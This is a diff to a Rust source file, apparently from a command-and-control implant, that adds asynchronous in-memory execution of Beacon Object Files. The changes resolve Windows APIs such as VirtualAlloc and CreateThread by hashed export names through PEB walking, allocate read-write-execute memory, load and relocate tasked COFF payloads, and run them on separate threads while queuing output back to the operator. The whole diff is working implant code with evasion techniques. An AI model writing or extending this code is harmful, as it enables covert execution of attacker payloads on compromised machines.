@@ -26,6 +26,7 @@
 
 use core::ffi::c_void;
 
+use core::sync::atomic::{AtomicU32, Ordering};
 use specter_core::coff::{self, Coff, Datum, Varargs};
 use specter_core::fnv::{fnv1a64, fnv1a64_bytes_wide_ci};
 use specter_core::heap::HEAP_ZERO_MEMORY;
@@ -42,6 +43,8 @@ use crate::runtime::bootstrap::Instance;
 const H_VIRTUAL_ALLOC: u64 = fnv1a64(b"VirtualAlloc");
 const H_VIRTUAL_FREE: u64 = fnv1a64(b"VirtualFree");
 const H_LOAD_LIBRARY_A: u64 = fnv1a64(b"LoadLibraryA");
+const H_CREATE_THREAD: u64 = fnv1a64(b"CreateThread");
+const H_CLOSE_HANDLE: u64 = fnv1a64(b"CloseHandle");
 /// ntdll export hashes.
 const H_RTL_ADD_FUNCTION_TABLE: u64 = fnv1a64(b"RtlAddFunctionTable");
 const H_RTL_DELETE_FUNCTION_TABLE: u64 = fnv1a64(b"RtlDeleteFunctionTable");
@@ -74,6 +77,71 @@ pub struct BofPending {
     pub sent: usize,
 }
 
+/// One async BOF run (one at a time): the worker thread handle and its
+/// heap context (the context also carries a private copy of the args — the
+/// task pack borrows the response buffer, reused next cycle).
+pub struct BofJob {
+    pub handle: isize,
+    pub ctx: *mut BofRunCtx,
+    pub task_id: u32,
+}
+
+/// Async BOF thread context (heap; layout pinned by the thread proc).
+#[repr(C)]
+pub struct BofRunCtx {
+    pub instance: usize,
+    pub entry: usize,
+    pub args: *const u8,
+    pub args_len: u32,
+    pub done: AtomicU32,
+}
+
+/// Async BOF thread body: publish the instance in THIS thread's TEB (so the
+/// Beacon API callbacks work), call the entry, mark done. The image stays
+/// allocated (native parity); the beacon thread reaps the job in bof_tick.
+///
+/// # Safety
+///
+/// `param` must reference a live heap `BofRunCtx` with a valid entry and a
+/// private args copy.
+pub unsafe extern "system" fn bof_thread_proc(param: *mut c_void) -> u32 {
+    let c = param as *mut BofRunCtx;
+    crate::runtime::bootstrap::store_instance(
+        (*c).instance as *mut crate::runtime::bootstrap::Instance,
+    );
+    let go: unsafe extern "C" fn(*const u8, u32) = core::mem::transmute((*c).entry);
+    go((*c).args, (*c).args_len);
+    (*c).done.store(1, Ordering::Release);
+    0
+}
+
+/// Spinlock guard for the BOF output queue (BOF thread writes, beacon
+/// thread drains). Instance-resident, never a global.
+struct BofLockGuard {
+    inst: *const Instance,
+}
+
+impl Drop for BofLockGuard {
+    fn drop(&mut self) {
+        unsafe {
+            (*self.inst).bof_lock.store(false, Ordering::Release);
+        }
+    }
+}
+
+unsafe fn lock_bof(instance: &Instance) -> BofLockGuard {
+    while instance
+        .bof_lock
+        .compare_exchange_weak(false, true, Ordering::Acquire, Ordering::Relaxed)
+        .is_err()
+    {
+        core::hint::spin_loop();
+    }
+    BofLockGuard {
+        inst: instance as *const Instance,
+    }
+}
+
 /// Free the pending queue's heap buffer, if any (one BOF at a time: a new
 /// task replaces an unfinished queue).
 ///
@@ -81,6 +149,7 @@ pub struct BofPending {
 ///
 /// `buf` must come from the instance heap and not be freed twice.
 pub unsafe fn drop_pending(instance: &mut Instance) {
+    let _g = lock_bof(instance);
     if let Some(p) = instance.bof_pending.take() {
         if !p.buf.is_null() {
             if let Some(heap) = instance.heap {
@@ -122,6 +191,7 @@ unsafe fn pending_grow(heap: &specter_core::heap::Heap, p: &mut BofPending, need
 ///
 /// Beacon thread (or a BOF thread holding the instance); heap resolved.
 pub unsafe fn queue_output(instance: &mut Instance, output_type: u32, bytes: &[u8]) {
+    let _g = lock_bof(instance);
     let Some(heap) = instance.heap else {
         return;
     };
@@ -167,6 +237,30 @@ pub unsafe fn queue_output(instance: &mut Instance, output_type: u32, bytes: &[u
 ///
 /// Beacon thread, at POST time (after `download_tick`).
 pub unsafe fn bof_tick(instance: &mut Instance, w: &mut Writer) {
+    let _g = lock_bof(instance);
+    // Reap a finished async BOF: finished record last (native order), then
+    // close the thread and free its context.
+    if let Some(job) = instance.bof_job.as_ref() {
+        if !job.ctx.is_null() && (*job.ctx).done.load(Ordering::Acquire) == 1 {
+            let Some(job) = instance.bof_job.take() else {
+                return;
+            };
+            queue_lifecycle_locked(instance, job.task_id, transport::BOF_STATE_FINISHED);
+            if job.handle != 0 {
+                let close = peb::find_export(instance.kernel32, H_CLOSE_HANDLE);
+                if !close.is_null() {
+                    (core::mem::transmute::<*const c_void, unsafe extern "system" fn(isize) -> i32>(
+                        close as *const c_void,
+                    ))(job.handle);
+                }
+            }
+            if !job.ctx.is_null() {
+                if let Some(h) = instance.heap {
+                    h.deallocate(job.ctx as *mut u8);
+                }
+            }
+        }
+    }
     let Some(p) = instance.bof_pending.as_mut() else {
         return;
     };
@@ -750,11 +844,6 @@ pub unsafe fn exec(instance: &mut Instance, task: &BofTask, results: &mut Writer
         let _ = transport::push_bof_lifecycle(results, task.task_id, transport::BOF_STATE_FINISHED);
         return;
     }
-    // Async: the started record goes out with this cycle's acknowledgements
-    // (Completed=false server-side); the run is sequential behind it.
-    if task.async_flag {
-        let _ = transport::push_bof_lifecycle(results, task.task_id, transport::BOF_STATE_STARTED);
-    }
     instance.bof_pending = Some(BofPending {
         task_id: task.task_id,
         buf: core::ptr::null_mut(),
@@ -762,6 +851,122 @@ pub unsafe fn exec(instance: &mut Instance, task: &BofTask, results: &mut Writer
         len: 0,
         sent: 0,
     });
+    // Async: the started record goes out with this cycle's acknowledgements
+    // (Completed=false server-side); the BOF runs on its own thread, reaped
+    // by bof_tick (finished record last). One async BOF at a time: a second
+    // async task while one runs degrades to the sequential path.
+    if task.async_flag && instance.bof_job.is_none() {
+        let _ = transport::push_bof_lifecycle(results, task.task_id, transport::BOF_STATE_STARTED);
+        match prepare(instance, task) {
+            Ok(p) => {
+                let Some(heap) = instance.heap else {
+                    let _ = transport::push_bof_output(
+                        results,
+                        task.task_id,
+                        transport::BOF_ERROR_ALLOC,
+                        b"",
+                    );
+                    let _ = transport::push_bof_lifecycle(
+                        results,
+                        task.task_id,
+                        transport::BOF_STATE_FINISHED,
+                    );
+                    return;
+                };
+                // One heap block: BofRunCtx + a private copy of the args
+                // (the task pack borrows the response buffer, reused next cycle).
+                let ctx_size = core::mem::size_of::<BofRunCtx>() + task.args.len();
+                let ctx = heap.allocate(ctx_size) as *mut BofRunCtx;
+                if ctx.is_null() {
+                    let _ = transport::push_bof_output(
+                        results,
+                        task.task_id,
+                        transport::BOF_ERROR_ALLOC,
+                        b"",
+                    );
+                    let _ = transport::push_bof_lifecycle(
+                        results,
+                        task.task_id,
+                        transport::BOF_STATE_FINISHED,
+                    );
+                    return;
+                }
+                let args_copy =
+                    (ctx as *mut u8).add(core::mem::size_of::<BofRunCtx>()) as *const u8;
+                let mut i = 0;
+                while i < task.args.len() {
+                    *(args_copy as *mut u8).add(i) = task.args[i];
+                    i += 1;
+                }
+                *ctx = BofRunCtx {
+                    instance: instance as *mut Instance as usize,
+                    entry: p.entry,
+                    args: args_copy,
+                    args_len: task.args.len() as u32,
+                    done: AtomicU32::new(0),
+                };
+                let create_thread = peb::find_export(instance.kernel32, H_CREATE_THREAD);
+                let h = if create_thread.is_null() {
+                    0
+                } else {
+                    let create_thread = core::mem::transmute::<
+                        *const c_void,
+                        unsafe extern "system" fn(
+                            *mut u8,
+                            usize,
+                            unsafe extern "system" fn(*mut c_void) -> u32,
+                            *mut c_void,
+                            u32,
+                            *mut u32,
+                        ) -> isize,
+                    >(create_thread as *const c_void);
+                    create_thread(
+                        core::ptr::null_mut(),
+                        0,
+                        bof_thread_proc,
+                        ctx as *mut c_void,
+                        0,
+                        core::ptr::null_mut(),
+                    )
+                };
+                if h == 0 {
+                    heap.deallocate(ctx as *mut u8);
+                    let _ = transport::push_bof_output(
+                        results,
+                        task.task_id,
+                        transport::BOF_ERROR_ALLOC,
+                        b"",
+                    );
+                    let _ = transport::push_bof_lifecycle(
+                        results,
+                        task.task_id,
+                        transport::BOF_STATE_FINISHED,
+                    );
+                    return;
+                }
+                instance.bof_job = Some(BofJob {
+                    handle: h,
+                    ctx,
+                    task_id: task.task_id,
+                });
+                crate::runtime::debug::log(instance, b"bof: async\n");
+            }
+            Err(e) => {
+                drop_pending(instance);
+                let _ =
+                    transport::push_bof_output(results, task.task_id, e.output_type, e.message());
+                let _ = transport::push_bof_lifecycle(
+                    results,
+                    task.task_id,
+                    transport::BOF_STATE_FINISHED,
+                );
+            }
+        }
+        return;
+    }
+    if task.async_flag {
+        let _ = transport::push_bof_lifecycle(results, task.task_id, transport::BOF_STATE_STARTED);
+    }
     match load_and_run(instance, task) {
         Ok(()) => {
             // Finished AFTER the outputs the BOF produced (native order):
@@ -781,38 +986,95 @@ pub unsafe fn exec(instance: &mut Instance, task: &BofTask, results: &mut Writer
 
 /// Queue the finished lifecycle record into the pending heap queue (after
 /// the outputs — the drain preserves the order).
-unsafe fn queue_lifecycle(instance: &mut Instance, task_id: u32, state: u8) {
+unsafe fn queue_lifecycle_locked(instance: &mut Instance, task_id: u32, state: u8) {
     let Some(heap) = instance.heap else {
         return;
     };
     let Some(p) = instance.bof_pending.as_mut() else {
         return;
     };
-    let record_len = 9; // taskId || command || state
+    let record_len = 10;
     if p.len + 4 + record_len > p.cap && !pending_grow(&heap, p, p.len + 4 + record_len) {
         return;
     }
     let mut w = p.buf.add(p.len);
-    let push4 = |w: *mut u8, v: u32| {
-        let b = v.to_be_bytes();
-        *w = b[0];
-        *w.add(1) = b[1];
-        *w.add(2) = b[2];
-        *w.add(3) = b[3];
-    };
-    push4(w, record_len as u32);
+    let total = (4 + record_len) as u32;
+    let b = total.to_be_bytes();
+    *w = b[0];
+    *w.add(1) = b[1];
+    *w.add(2) = b[2];
+    *w.add(3) = b[3];
     w = w.add(4);
-    push4(w, task_id);
+    let t = task_id.to_be_bytes();
+    *w = t[0];
+    *w.add(1) = t[1];
+    *w.add(2) = t[2];
+    *w.add(3) = t[3];
     w = w.add(4);
-    push4(w, transport::COMMAND_EXEC_BOF);
+    let c = transport::COMMAND_EXEC_BOF.to_be_bytes();
+    *w = c[0];
+    *w.add(1) = c[1];
+    *w.add(2) = c[2];
+    *w.add(3) = c[3];
     w = w.add(4);
     *w = state;
     p.len += 4 + record_len;
 }
 
+unsafe fn queue_lifecycle(instance: &mut Instance, task_id: u32, state: u8) {
+    let _g = lock_bof(instance);
+    queue_lifecycle_locked(instance, task_id, state);
+}
+
 /// The full load (runner.c): layout, alloc, copy, resolve, relocate, entry.
 /// The image is freed on error (success leaks it — GUI/COM BOFs may hold
 /// dangling callbacks, native parity).
+pub struct Prepared {
+    pub entry: usize,
+}
+
+unsafe fn prepare(instance: &mut Instance, task: &BofTask) -> Result<Prepared, LoadError> {
+    let coff = match Coff::parse(task.bof) {
+        Some(c) => c,
+        None => return Err(LoadError::simple(transport::BOF_ERROR_PARSE)),
+    };
+    let plan = match coff::plan_layout(&coff) {
+        Some(p) => p,
+        None => return Err(LoadError::simple(transport::BOF_ERROR_PARSE)),
+    };
+    let total = plan.total;
+    let va = peb::find_export(instance.kernel32, H_VIRTUAL_ALLOC);
+    if va.is_null() {
+        return Err(LoadError::simple(transport::BOF_ERROR_ALLOC));
+    }
+    let va = core::mem::transmute::<
+        *const c_void,
+        unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void,
+    >(va as *const c_void);
+    let base = va(
+        core::ptr::null_mut(),
+        total,
+        MEM_RESERVE | MEM_COMMIT,
+        PAGE_EXECUTE_READWRITE,
+    ) as *mut u8;
+    if base.is_null() {
+        return Err(LoadError::simple(transport::BOF_ERROR_ALLOC));
+    }
+    let mut entry = 0usize;
+    let result = load_into(instance, &coff, task, base, &plan, &mut entry);
+    if result.is_err() {
+        let vf = peb::find_export(instance.kernel32, H_VIRTUAL_FREE);
+        if !vf.is_null() {
+            let vf = core::mem::transmute::<
+                *const c_void,
+                unsafe extern "system" fn(*mut c_void, usize, u32) -> i32,
+            >(vf as *const c_void);
+            vf(base as *mut c_void, 0, MEM_RELEASE);
+        }
+    }
+    result.map(|_| Prepared { entry })
+}
+
 unsafe fn load_and_run(instance: &mut Instance, task: &BofTask) -> Result<(), LoadError> {
     let coff = match Coff::parse(task.bof) {
         Some(c) => c,
@@ -846,7 +1108,7 @@ unsafe fn load_and_run(instance: &mut Instance, task: &BofTask) -> Result<(), Lo
         return Err(LoadError::simple(transport::BOF_ERROR_ALLOC));
     }
 
-    let result = load_into(instance, &coff, task, base, &plan);
+    let result = load_into(instance, &coff, task, base, &plan, core::ptr::null_mut());
     if result.is_err() {
         let vf = peb::find_export(instance.kernel32, H_VIRTUAL_FREE);
         if !vf.is_null() {
@@ -868,6 +1130,7 @@ unsafe fn load_into(
     task: &BofTask,
     base: *mut u8,
     plan: &coff::Layout,
+    entry_out: *mut usize,
 ) -> Result<(), LoadError> {
     let nsec = coff.num_sections();
     // Section copies (manual: the memcpy rule).
@@ -1046,9 +1309,14 @@ unsafe fn load_into(
         }
     }
 
-    // Execute: go(args, argslen) — a direct call, like the original.
-    let go: unsafe extern "C" fn(*const u8, u32) = core::mem::transmute(entry);
-    go(task.args.as_ptr(), task.args.len() as u32);
+    // Execute: go(args, argslen) — a direct call, like the original. With
+    // `entry_out` set (async path), skip the call and hand the entry back.
+    if entry_out.is_null() {
+        let go: unsafe extern "C" fn(*const u8, u32) = core::mem::transmute(entry);
+        go(task.args.as_ptr(), task.args.len() as u32);
+    } else {
+        *entry_out = entry as usize;
+    }
 
     if func_table {
         let del = peb::find_export(instance.ntdll, H_RTL_DELETE_FUNCTION_TABLE);
